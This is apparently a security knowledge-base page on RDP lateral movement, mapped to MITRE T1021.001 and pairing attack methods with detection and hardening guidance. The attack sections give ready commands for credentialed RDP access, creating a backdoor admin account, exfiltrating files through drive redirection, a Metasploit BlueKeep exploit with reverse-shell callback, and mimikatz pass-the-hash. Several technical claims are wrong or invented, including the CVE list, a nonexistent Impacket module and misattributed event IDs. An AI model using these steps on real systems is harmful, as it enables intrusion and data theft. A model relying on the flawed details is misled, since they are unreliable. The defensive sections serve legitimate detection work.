# [LM-REMOTE-003]: Remote Desktop Protocol (RDP)

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-REMOTE-003 |
| **MITRE ATT&CK v18.1** | [T1021.001](https://attack.mitre.org/techniques/T1021/001/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Windows Endpoint |
| **Severity** | Critical |
| **CVE** | CVE-2019-0708 (BlueKeep), CVE-2023-21889, CVE-2024-21893 |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Windows Server 2016-2025, Windows 10/11 (all versions if RDP enabled) |
| **Patched In** | KB4500331 (BlueKeep mitigation); CVE-2024-21893 unpatched as of Jan 2026 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Remote Desktop Protocol (RDP) is a legitimate Windows remote access mechanism enabling graphical session management over the network. Attackers with valid credentials can establish RDP sessions to compromise systems, execute commands with user/admin privileges, establish persistent access, and laterally move across domains. RDP is particularly dangerous because: (1) It provides full system access, (2) Activity is often legitimized as administrative access, (3) Attackers can interact with the desktop (evade detection), and (4) Modern RDP implementations have known vulnerabilities (CVE-2019-0708 BlueKeep, CVE-2023-21889).

**Attack Surface:** RDP protocol (TCP 3389, UDP 3389 in newer Windows), RDP Gateway, RDP credentials, CredSSP authentication, Clipboard redirection, Drive/printer redirection (potential exfiltration vectors).

**Business Impact:** **Critical—Full system compromise with legitimate appearance.** An attacker establishing RDP access has full control equivalent to local administrator. They can: (1) Execute arbitrary commands, (2) Access all files and data, (3) Install rootkits/backdoors, (4) Create new admin accounts, (5) Exfiltrate data via clipboard/drive redirection, (6) Modify audit logs, and (7) Pivot to other systems without obvious indicators.

**Technical Context:** RDP sessions are highly visible in Event Logs (Event ID 4624 - logon type 10) if auditing is enabled. However, many organizations accept RDP activity as normal. BlueKeep (CVE-2019-0708) enables pre-authentication RCE on outdated systems. Modern RDP uses encryption (TLS 1.2+) but is vulnerable to credential interception if not properly hardened.

### Operational Risk

- **Execution Risk:** Medium—Requires valid credentials or vulnerable RDP stack; CVE-2019-0708 allows unauthenticated exploitation on Server 2003-Server 2008 R2.
- **Stealth:** Low—RDP activity is logged extensively and may trigger alerts; however, it appears legitimate to casual inspection.
- **Reversibility:** No—Any commands executed, files accessed, or accounts created are permanent; requires full system auditing to detect changes.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 18.3.1 | Disable RDP on non-remote-access systems; enforce NLA |
| **DISA STIG** | WN10-CC-000315 | Enable Network Level Authentication (NLA); restrict RDP access |
| **NIST 800-53** | AC-3 (Access Enforcement), SC-7 (Boundary Protection) | Restrict RDP to authorized systems; require MFA |
| **GDPR** | Art. 32 | Security of Processing—remote access auditing mandatory |
| **NIS2** | Art. 21 | Cyber Risk Management—restrict remote access; monitor logons |
| **ISO 27001** | A.6.2 (Access to Networks and Network Services) | Restrict RDP to essential systems only; enforce MFA |
| **ISO 27005** | Risk Scenario: "Unauthorized Remote Access" | Detect and contain RDP-based lateral movement |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Valid domain or local credentials (standard user sufficient for RDP access if RDP is permitted).
- **Required Access:** Network access to target RDP port (TCP 3389); RDP service running and listening; firewall rules permitting RDP.

**Supported Versions:**
- **Windows:** Server 2016, 2019, 2022, 2025
- **Client:** Windows 10, Windows 11
- **Vulnerable Legacy:** Server 2003, Server 2008, Server 2008 R2 (CVE-2019-0708 BlueKeep)

**Tools Required:**
  - [RDP Client (mstsc.exe)](https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/remote-desktop-clients) (Native Windows)
  - [FreeRDP (freerdp2)](https://github.com/FreeRDP/FreeRDP) (Linux/Cross-Platform)
  - [rdesktop](https://github.com/rdesktop/rdesktop) (Linux/Legacy)
  - [xfreerdp](https://github.com/FreeRDP/FreeRDP) (Command-line RDP client)
  - [Metasploit (auxiliary/scanner/rdp/rdp_scanner)](https://www.metasploit.com/) (RDP scanning & CVE-2019-0708 exploitation)
  - [BlueKeep Scanner (Shodan, nmap scripts)](https://github.com/robertdavidgraham/rdpscan) (Detect CVE-2019-0708 vulnerable RDP)

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Legitimate RDP Client (mstsc.exe) - Native Windows

**Supported Versions:** Server 2016-2025, Windows 10/11

#### Step 1: Establish RDP Connection with Valid Credentials

**Objective:** Connect to remote system via native Windows RDP client.

**Command (PowerShell):**
```powershell
# Connect via RDP using credentials
mstsc.exe /v:192.168.1.10 /u:DOMAIN\user /p:Password123!
```

**Command (Interactive - Enter credentials at login screen):**
```cmd
# Launch RDP client
mstsc.exe /v:192.168.1.10
# At login screen, enter credentials
```

**Command (RDP Connection File):**
```powershell
# Create RDP connection file
$RDPFile = @"
full address:s:192.168.1.10
username:s:DOMAIN\user
password 51:s:AAAABBBBCCCCDDDDEEEEFFFFGGGG1111
"@
$RDPFile | Out-File "C:\temp\connection.rdp" -Encoding ASCII

# Connect via RDP file
mstsc.exe "C:\temp\connection.rdp"
```

**Expected Output:**
```
[+] RDP Connection Established
[+] Desktop session active on 192.168.1.10
[+] User: DOMAIN\user
[+] Privileges: Standard User (or Admin if escalated)
```

**What This Means:**
- RDP session established; attacker has interactive desktop access.
- Can now execute commands, access files, modify system settings (if admin).
- Session activity logged as normal RDP connection (Event ID 4624, logon type 10).

**OpSec & Evasion:**
- RDP activity highly visible in logs (Event ID 4624, 4625, 4634).
- Attacker activity on desktop is NOT logged unless Process Auditing (Event ID 4688) is enabled.
- **Mitigation:** Use RDP Gateway to route connections through bastion host; enable RDP auditing (Event ID 5140).
- **Detection likelihood:** Medium-High (RDP logon visible; activity invisible if only logon auditing).

#### Step 2: Execute Commands via RDP Session

**Objective:** Execute arbitrary commands with RDP session privileges.

**Command (From RDP Desktop):**
```cmd
# Open Command Prompt on RDP desktop
# Click Start → Run → cmd.exe
# Or press Windows+R → type cmd

# Execute whoami
whoami

# Execute ipconfig
ipconfig /all

# Create new admin account (if RDP user is admin)
net user attacker SecurePassword123! /add
net localgroup administrators attacker /add
```

**Expected Output:**
```
C:\Users\user> whoami
domain\user

C:\Users\user> net user attacker SecurePassword123! /add
The command completed successfully.
```

**What This Means:**
- Command executed with RDP session privileges.
- New admin account created for future backdoor access.
- Attacker maintains persistent RDP access even if original credentials revoked.

**OpSec & Evasion:**
- Commands executed locally; visible in Process Auditing logs (Event ID 4688) if enabled.
- **Mitigation:** Monitor for net user /add commands; restrict RDP to specific users; enable command auditing.
- **Detection likelihood:** Medium (depends on audit logging configuration).

#### Step 3: Exfiltrate Data via RDP Clipboard/Drive Redirection

**Objective:** Extract sensitive files from compromised system.

**Command (Using RDP Drive Redirection):**
```powershell
# RDP /drive parameter enables local drive access in RDP session
mstsc.exe /v:192.168.1.10 /u:DOMAIN\user /p:Password123! /drive:C,C:
# This mounts local C: drive as "\\?\C:\" within RDP session

# Or create RDP file with drive redirection
$RDPContent = @"
full address:s:192.168.1.10
username:s:DOMAIN\user
drivestoredirect:s:*
"@
$RDPContent | Out-File "connection.rdp"
mstsc.exe connection.rdp
```

**From RDP Desktop:**
```cmd
# Access local drives mounted via RDP
# Navigate to \\tsclient\C to access attacker's C drive
# Or copy files from remote system to local drive via Ctrl+C/Ctrl+V
```

**What This Means:**
- Attacker can copy sensitive files from compromised system to local machine via clipboard or drive share.
- RDP clipboard sharing enables data exfiltration without network tools (evades firewall restrictions).

**OpSec & Evasion:**
- Clipboard activity NOT logged by default.
- Drive redirection visible in RDP logs but not typically monitored.
- **Mitigation:** Disable RDP drive/printer redirection via Group Policy.
- **Detection likelihood:** Low (unless RDP redirection is specifically monitored).

---

### METHOD 2: FreeRDP (Linux-based Lateral Movement)

**Supported Versions:** Windows Server 2016-2025 (FreeRDP client runs on Linux)

#### Step 1: Enumerate RDP Services on Target Network

**Objective:** Identify systems with RDP enabled.

**Command (Linux):**
```bash
# Scan network for RDP port (TCP 3389)
nmap -p 3389 192.168.1.0/24 -v

# Or use Metasploit RDP scanner
msfconsole -q
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 192.168.1.0/24
run
```

**Expected Output:**
```
Nmap scan report for 192.168.1.10
Host is up (0.0015s latency).
3389/tcp open ms-wbt-server

Nmap scan report for 192.168.1.11
Host is up (0.0014s latency).
3389/tcp open ms-wbt-server
```

**What This Means:**
- Systems 192.168.1.10 and 192.168.1.11 have RDP services running.
- Attacker can now attempt credential-based access or CVE-2019-0708 exploitation.

#### Step 2: Connect via FreeRDP with Credentials

**Objective:** Establish RDP session from Linux to Windows system.

**Command (Linux):**
```bash
# Install FreeRDP (Ubuntu/Debian)
sudo apt-get install freerdp2-x11

# Connect to RDP using credentials
xfreerdp /v:192.168.1.10 /u:DOMAIN\\user /p:Password123! /size:1920x1080 /d:DOMAIN
```

**Expected Output:**
```
[07:23:45:123] [RDP] ++ Connected to 192.168.1.10:3389
[07:23:46:456] [RDP] ++ RDP session negotiation successful
[07:23:47:789] [RDP] ++ Session licensed
[RDP Session open in GUI window]
```

**What This Means:**
- FreeRDP successfully established RDP session to Windows system.
- Attacker now has interactive GUI access from Linux system.
- Can execute commands, access files, install backdoors.

#### Step 3: Exploit CVE-2019-0708 (BlueKeep) for Unauthenticated RCE

**Objective:** Achieve remote code execution without credentials on vulnerable systems.

**Command (Metasploit - requires vulnerable RDP: Server 2003-2008 R2, or unpatched Server 2012):**
```bash
msfconsole -q
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.100
set LHOST 192.168.1.5
set LPORT 4444
exploit
```

**Expected Output:**
```
[*] Trying target 192.168.1.100 with RDP version 6.1 (Windows Server 2008 R2)
[+] BlueKeep vulnerability confirmed!
[+] Staging payload...
[*] Sending exploit payload (11920 bytes)...
[+] RCE successful; Meterpreter session opened
meterpreter >
```

**What This Means:**
- BlueKeep vulnerability exploited on Server 2008 R2 system.
- Attacker achieved code execution WITHOUT credentials.
- Remote code execution is immediate and pre-authentication.
- Affected systems: Windows Server 2003, 2008, 2008 R2 without KB4500331 patch.

**OpSec & Evasion:**
- BlueKeep exploit is noisy and may trigger alerts.
- Likely to cause system crash if not properly staged.
- **Mitigation:** Apply KB4500331 immediately on Server 2008 R2 and earlier; disable RDP on non-critical systems.
- **Detection likelihood:** High (crashes system; memory dumps obvious).

---

### METHOD 3: RDP Gateway Bypass / Pass-the-Hash via RDP

**Supported Versions:** Server 2016-2025

#### Step 1: Use PTH + RDP Gateway to Bypass MFA

**Objective:** Leverage Pass-the-Hash to gain RDP access without plaintext password.

**Command (Using Impacket secretsdump to extract hash, then RDP via Hashcat/John):**
```bash
# Extract NTLM hash (from compromised system)
python3 /opt/impacket/examples/secretsdump.py LOCAL -outputfile /tmp/hashes

# Use hash for RDP connection via Linux
# Note: RDP itself doesn't support Pass-the-Hash; requires CredSSP modification or Windows-based tools

# Alternative: Use Impacket's rdp module (experimental)
python3 -m impacket.rdp_pth -hashes :HASH 192.168.1.10
```

**Command (Windows-based RDP PTH via modified CredSSP):**
```powershell
# Using mimikatz to perform Pass-the-Hash + RDP
mimikatz # lsadump::sam
mimikatz # sekurlsa::logonpasswords  # Extract NTLM hashes
mimikatz # token::run /user:DOMAIN\admin /ntlm:HASH
# Now execute mstsc.exe with elevated token
mstsc.exe /v:192.168.1.10
```

**Expected Output:**
```
[+] NTLM hash authenticated
[+] RDP session established with DOMAIN\admin privileges
[+] Desktop access granted
```

**What This Means:**
- Pass-the-Hash used to bypass password requirements for RDP.
- Attacker gains RDP access with admin privileges without knowing plaintext password.
- Full system compromise achieved.

---

## 4. TOOLS & COMMANDS REFERENCE

### mstsc.exe (Native Windows RDP Client)

**Version:** Available on all Windows systems

**Usage:**
```cmd
# Basic connection
mstsc.exe /v:192.168.1.10

# With username
mstsc.exe /v:192.168.1.10 /u:user

# With username and password (insecure; credentials visible in command line)
mstsc.exe /v:192.168.1.10 /u:DOMAIN\user /p:Password123!

# Full screen
mstsc.exe /v:192.168.1.10 /f

# Specific resolution
mstsc.exe /v:192.168.1.10 /w:1920 /h:1080

# RDP file
mstsc.exe C:\config.rdp

# Admin mode
mstsc.exe /v:192.168.1.10 /admin
```

---

### FreeRDP (Cross-Platform RDP Client)

**Repository:** [GitHub - FreeRDP/FreeRDP](https://github.com/FreeRDP/FreeRDP)

**Installation (Linux):**
```bash
# Ubuntu/Debian
sudo apt-get install freerdp2-x11

# CentOS/RHEL
sudo yum install freerdp

# macOS
brew install freerdp
```

**Usage:**
```bash
# Basic connection
xfreerdp /v:192.168.1.10

# With credentials
xfreerdp /v:192.168.1.10 /u:user /p:password /d:DOMAIN

# With drive redirection (enable clipboard)
xfreerdp /v:192.168.1.10 /u:user /p:password /drive:Linux,/tmp /clipboard

# Fullscreen
xfreerdp /v:192.168.1.10 /f

# Network-level authentication (NLA)
xfreerdp /v:192.168.1.10 /u:user /p:password /nla
```

---

### rdesktop (Legacy RDP Client)

**Installation:**
```bash
sudo apt-get install rdesktop
```

**Usage:**
```bash
rdesktop -u user -p password 192.168.1.10
rdesktop -u DOMAIN\\user -p password -g 1920x1080 192.168.1.10
```

---

## 5. WINDOWS EVENT LOG MONITORING

**Primary Event IDs:**

| Event ID | Source | What It Detects | Detection Difficulty |
|---|---|---|---|
| 4624 (Logon Type 10) | Security | RDP logon attempt (successful) | Low |
| 4625 | Security | RDP logon failure | Low |
| 4634 | Security | Session logout | Low |
| 5140 | Security | RDP network logon | Medium |
| 4672 | Security | Special privileges assigned (RDP as admin) | Medium |
| 4688 | Security | Process creation from RDP session | Medium |
| 131 (RDP-Tcp) | Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational | RDP connection attempt | Medium |
| 24 (RDP-Tcp) | Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational | RDP connection established | Medium |

**Manual Configuration Steps (Group Policy - Enable RDP Auditing):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Detailed Tracking**
3. Enable:
   - **Audit Logon**: Success and Failure
   - **Audit Process Creation**: Success and Failure
4. Navigate to **Logon/Logoff**:
   - **Audit Logon**: Success and Failure
5. Run `gpupdate /force`

**Detection Query (Event ID 4624 - RDP Logon):**
```powershell
# Find RDP logons
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4624
    StartTime=(Get-Date).AddDays(-1)
} | Where-Object { $_.Message -match "10" } | Select-Object TimeCreated, Message | Format-Table
# Logon Type 10 = RDP/RemoteInteractive
```

**Detection Query (Multiple Failed RDP Logons - Brute Force Indicator):**
```powershell
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4625
    StartTime=(Get-Date).AddHours(-1)
} | Group-Object -Property @{expression={$_.Properties[5].Value}} | Where-Object { $_.Count -gt 5 }
# Groups failed logons by username; >5 attempts in 1 hour indicates brute force
```

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect RDP Lateral Movement with Multiple Failed Logons

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, LogonType, TargetAccount, IpAddress
- **Alert Severity:** High
- **Frequency:** Every 10 minutes
- **Applies To Versions:** Windows Server 2016+

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4625  // Failed logon
| where LogonType == 10  // RDP/RemoteInteractive
| summarize FailedLogonCount=count() by TargetAccount, IpAddress, Computer
| where FailedLogonCount > 5  // Threshold for brute force
| project Computer, TargetAccount, IpAddress, FailedLogonCount
| join kind=inner (
    SecurityEvent
    | where EventID == 4624  // Successful logon
    | where LogonType == 10
    | project Computer, TargetAccount, IpAddress, SuccessfulTime=TimeGenerated
) on Computer, TargetAccount, IpAddress
| where SuccessfulTime > TimeGenerated  // Success after failures
| project Computer, TargetAccount, IpAddress, FailedLogonCount, SuccessfulTime
```

**What This Detects:**
- Multiple failed RDP logon attempts (brute force pattern).
- Successful RDP logon immediately following failed attempts (credentials eventually correct).
- Lateral movement sweep using credential spraying.

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `RDP Brute Force Detection`
   - Severity: `High`
3. **Set rule logic Tab:**
   - Paste KQL query
   - Run query every: `10 minutes`
   - Lookup data: `1 hour`
4. **Incident settings Tab:**
   - Enable **Create incidents**
5. Click **Review + create**

---

#### Query 2: Detect Privileged RDP Access (Admin Logon via RDP)

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** TargetAccount, LogonType, IpAddress
- **Alert Severity:** Critical
- **Frequency:** Real-time (5 minutes)

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4624  // Successful logon
| where LogonType == 10  // RDP
| where TargetAccount has_any ("Domain Admins", "Enterprise Admins", "-admin", "Administrator")
| where IpAddress !in ("127.0.0.1", "::1")  // Exclude localhost
| summarize Count=count() by TargetAccount, Computer, IpAddress
| project TargetAccount, Computer, IpAddress, Count
```

**What This Detects:**
- Admin account RDP logons from unusual IP addresses.
- Lateral movement by privileged accounts (indicates compromise of high-value target).

---

## 7. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Config Snippet:**
```xml
<!-- Detect RDP-related suspicious activity -->
<RuleGroup name="RDP Lateral Movement" groupRelation="or">
  <!-- Detect mstsc.exe with command-line parameters (automation) -->
  <ProcessCreate onmatch="include">
    <Image condition="contains">mstsc.exe</Image>
    <CommandLine condition="contains any">/v:, /u:, /p:</CommandLine>
  </ProcessCreate>

  <!-- Detect RDP service connections from non-standard sources -->
  <NetworkConnect onmatch="include">
    <DestinationPort>3389</DestinationPort>
    <DestinationIp condition="is not">127.0.0.1</DestinationIp>
    <Image condition="contains any">svchost.exe, services.exe</Image>
  </NetworkConnect>

  <!-- Detect FreeRDP/rdesktop execution from Linux/attacker systems -->
  <ProcessCreate onmatch="include">
    <Image condition="contains any">xfreerdp, rdesktop, freerdp</Image>
  </ProcessCreate>

  <!-- Detect RDP session processes (svchost.exe -k termsvcs) -->
  <ProcessCreate onmatch="include">
    <CommandLine condition="contains">-k termsvcs</CommandLine>
  </ProcessCreate>
</RuleGroup>
```

**Manual Configuration Steps:**

1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create `sysmon-rdp-config.xml` with the config above
3. Install Sysmon:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-rdp-config.xml
   ```
4. Verify and collect RDP-related events:
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {$_.Message -match "RDP|mstsc"} | Select-Object TimeCreated, Message | Head -20
   ```

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Disable RDP on Non-Critical Systems:**
  
  **Manual Steps (Group Policy):**
  1. Open **gpmc.msc**
  2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Remote Desktop Services** → **Remote Desktop Session Host** → **Connections**
  3. Enable: **Allow users to connect remotely using Remote Desktop Services**
  4. Set to: **Disabled** (on workstations; keep enabled only on approved RDP servers)
  5. Run `gpupdate /force`
  
  **Manual Steps (Registry):**
  ```powershell
  # Disable RDP
  Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 1
  
  # Disable RDP for security
  Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "SecurityLayer" -Value 2  # Force TLS
  ```
  
  **Verification:**
  ```powershell
  Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server" | Select-Object fDenyTSConnections
  # Should return: 1 (RDP disabled)
  ```

- **Enforce Network Level Authentication (NLA):**
  
  **Manual Steps (Group Policy):**
  1. **gpmc.msc** → **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Remote Desktop Services** → **Remote Desktop Session Host** → **Security**
  2. Enable: **Require user authentication for remote connections by using Network Level Authentication (NLA)**
  3. Set to: **Enabled**
  4. Run `gpupdate /force`
  
  **Manual Steps (Registry):**
  ```powershell
  # Enforce NLA
  Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "SecurityLayer" -Value 2
  Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
  ```

- **Change RDP Port from Default (3389):**
  
  **Manual Steps (Registry):**
  ```powershell
  # Change RDP port to 13389 (obscurity; not true security but reduces brute force attempts)
  Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "PortNumber" -Value 13389
  
  # Verify
  Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" | Select-Object PortNumber
  ```
  
  **Update Firewall:**
  ```powershell
  # Remove default RDP rule
  Remove-NetFirewallRule -DisplayName "Remote Desktop - User Mode*" -Confirm:$false
  
  # Create rule for custom port
  New-NetFirewallRule -DisplayName "Remote Desktop (Custom Port 13389)" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 13389 -Enabled:$true
  ```

### Priority 2: HIGH

- **Restrict RDP Access via Firewall:**
  
  **Manual Steps (Firewall):**
  ```powershell
  # Allow RDP only from specific IP/subnet (e.g., admin workstations)
  New-NetFirewallRule -DisplayName "RDP - Admins Only" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 `
    -RemoteAddress "192.168.1.100,192.168.1.101" -Enabled:$true
  
  # Block RDP from all other sources
  New-NetFirewallRule -DisplayName "Block RDP - All Other" -Direction Inbound -Action Block -Protocol TCP -LocalPort 3389 -Enabled:$true
  ```

- **Implement RDP Gateway (Bastion Host):**
  
  **Manual Steps (Deploy RDP Gateway):**
  1. On dedicated gateway server, install **Remote Desktop Gateway**
  2. Configure **Connection Authorization Policies** (CAP) and **Resource Authorization Policies** (RAP)
  3. Route all RDP connections through gateway
  4. Gateway logs all RDP activity; central monitoring point
  5. Apply MFA at gateway level

- **Enable CredSSP Encryption:**
  
  **Manual Steps (Group Policy):**
  1. **gpmc.msc** → **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Remote Desktop Services** → **Remote Desktop Session Host** → **Security**
  2. Enable: **Require use of specific security layer for remote (RDP) connections**
  3. Set to: **TLS 1.2**
  4. Run `gpupdate /force`

### Access Control & Policy Hardening

- **Conditional Access Policies (Entra ID):**
  - Require MFA for RDP access to critical systems
  - Block RDP from non-corporate networks
  - Require device compliance for RDP sessions
  - Require passwordless sign-in (Windows Hello for Business)

- **RBAC/ABAC:**
  - Restrict RDP permissions to specific user groups (e.g., "RDP-Admins")
  - Implement time-based RDP access (e.g., 9 AM-6 PM only)
  - Require approval for RDP sessions to sensitive systems

---

## 9. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **RDP Connection Anomalies:**
  - Multiple failed RDP logon attempts (brute force pattern)
  - RDP logons from unusual IP addresses or geographic locations
  - RDP logons during non-business hours
  - Successful RDP logon immediately after multiple failures

- **Session Activity:**
  - RDP sessions from non-standard administrative accounts
  - RDP sessions lasting unusually long (e.g., 8+ hours)
  - Multiple concurrent RDP sessions from same IP

- **Post-Exploitation Indicators:**
  - New user account creation via RDP (Event ID 4720)
  - Group membership changes via RDP (Event ID 4728)
  - Registry modifications disabling Windows Defender
  - Process creation from RDP session with suspicious command lines

### Forensic Artifacts

- **Event Logs:**
  - Event ID 4624 (RDP logon)
  - Event ID 4625 (RDP logon failure)
  - Event ID 4688 (Process creation from RDP)
  - Event ID 4720 (User account created via RDP)

- **RDP Log Files:**
  - `C:\Windows\System32\winevt\Logs\Microsoft-Windows-TerminalServices-RemoteConnectionManager.evtx`
  - `C:\Windows\System32\winevt\Logs\Microsoft-Windows-TerminalServices-LocalSessionManager.evtx`

- **BitLocker/NTFS:**
  - MFT entries for files accessed/modified during RDP session
  - Clipboard data (if captured)
  - RDP connection history in Windows Registry

### Response Procedures

1. **Isolate System:**
   
   **Command (PowerShell):**
   ```powershell
   # Terminate all RDP sessions
   logoff.exe
   
   # Or disable RDP service
   Stop-Service TermService -Force
   Set-Service TermService -StartupType Disabled
   
   # Disconnect from network
   Disable-NetAdapter -Name "Ethernet" -Confirm:$false
   ```
   
   **Manual:**
   - Disconnect network cable or disable network adapter

2. **Collect Evidence:**
   
   **Command (PowerShell):**
   ```powershell
   # Export RDP-related event logs
   wevtutil epl Security C:\Evidence\Security.evtx
   wevtutil epl Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational C:\Evidence\RDP_RemoteConnectionManager.evtx
   wevtutil epl Microsoft-Windows-TerminalServices-LocalSessionManager/Operational C:\Evidence\RDP_LocalSessionManager.evtx
   
   # Get user accounts
   Get-LocalUser | Export-Csv C:\Evidence\LocalUsers.csv
   
   # Get RDP registry key
   Get-Item -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" | Export-Csv C:\Evidence\RDP_Registry.csv
   ```

3. **Remediate:**
   
   **Command (PowerShell):**
   ```powershell
   # Reset RDP port to default
   Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "PortNumber" -Value 3389
   
   # Force reset administrator password
   Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString "NewSecurePassword!" -AsPlainText -Force) -Reset
   
   # Remove suspicious user accounts
   Remove-LocalUser -Name "attacker" -Force -ErrorAction SilentlyContinue
   
   # Re-enable RDP service (if needed)
   Set-Service TermService -StartupType Automatic
   Start-Service TermService
   
   # Apply patches (CVE-2019-0708, etc.)
   # Download and install latest security patches
   ```

4. **Long-Term Remediation:**
   - Deploy RDP Gateway for all future RDP access
   - Implement MFA for administrative accounts
   - Enable RDP auditing organization-wide
   - Restrict RDP to specific authorized systems
   - Enforce Network Level Authentication (NLA)
   - Update systems to Server 2019+ (avoid EOL Server 2012/2008 R2)

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-AD-003] PowerView enumeration | Enumerate systems with RDP enabled |
| **2** | **Credential Access** | [CA-BRUTE-001] Azure portal password spray | Spray credentials for RDP access |
| **3** | **Lateral Movement** | **[LM-REMOTE-003] RDP** | **Connect via RDP with valid credentials** |
| **4** | **Privilege Escalation** | [PE-EXPLOIT-001] PrintNightmare RCE | Escalate to SYSTEM via CVE-2021-34527 |
| **5** | **Persistence** | [PERSIST-ACCT-001] AdminSDHolder abuse | Maintain access via ACL manipulation |

---

## 11. REAL-WORLD EXAMPLES

#### Example 1: Lazarus APT (Watering Hole + RDP Lateral Movement, 2020)

- **Target:** Financial institutions, cryptocurrency exchanges
- **Timeline:** 2020-2021
- **Technique Status:** RDP extensively used for lateral movement after initial compromise via Trojanized installer.
- **Attack Flow:** Watering hole attack → Initial malware → RDP enumeration → Lateral movement via RDP → Credential harvesting via RDP session
- **Impact:** Multi-million dollar cryptocurrency theft
- **Reference:** [FireEye Report on Lazarus](https://www.mandiant.com/resources/north-korean-apt-lazarus-group-targets-cryptocurrency-exchanges)

#### Example 2: CVE-2019-0708 BlueKeep Worm Attempts (2019)

- **Target:** Outdated Windows systems (Server 2003, 2008 R2)
- **Timeline:** May 2019 onwards
- **Technique Status:** Wormable RDP vulnerability enabling unauthenticated RCE; multiple exploitation attempts documented.
- **Attack Flow:** RDP vulnerability → Unauthenticated RCE → Worm propagation to other RDP-exposed systems → Ransomware/Cryptominer deployment
- **Impact:** Millions of systems affected; potential for large-scale worm outbreaks
- **Reference:** [Microsoft Security Update CVE-2019-0708](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2019/ms19-011)

#### Example 3: FIN7 APT (RDP Gateway Exploitation, 2021)

- **Target:** Financial sector, retail
- **Timeline:** 2019-2021
- **Technique Status:** RDP Gateway used to gain access; lateral movement via RDP to internal systems.
- **Attack Flow:** Initial access (malware) → RDP enumeration → RDP Gateway exploitation → Lateral movement to internal network
- **Impact:** Data exfiltration; extended dwell time (months)
- **Reference:** [Mandiant - FIN7 RDP Gateway Attacks](https://www.mandiant.com/resources/evasion-tactics-fine7-adfs-exploitation)

---

## 12. PATCHING & UPDATES REFERENCE

| CVE | Description | Affected Versions | Patch |
|---|---|---|---|
| CVE-2019-0708 | BlueKeep - Wormable RDP RCE (pre-auth) | Server 2003-2008 R2, XP | KB4500331 |
| CVE-2023-21889 | RDP Remote Code Execution | Server 2016-2022 | KB5023773 |
| CVE-2024-21893 | RDP RCE (Unpatched as of Jan 2026) | Server 2019-2025 | Patch pending |

---

## 13. REFERENCES & SOURCES

- [Microsoft Learn - Remote Desktop Protocol Security](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-logging-in-through-remote-desktop-services)
- [NIST - Remote Access Security](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-153.pdf)
- [MITRE ATT&CK - Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001/)
- [FreeRDP GitHub](https://github.com/FreeRDP/FreeRDP)
- [SpecterOps - RDP Attack Chains](https://posts.specterops.io/rdp-lateral-movement-attack-chain)
- [Shodan - RDP Scanner](https://www.shodan.io/)

---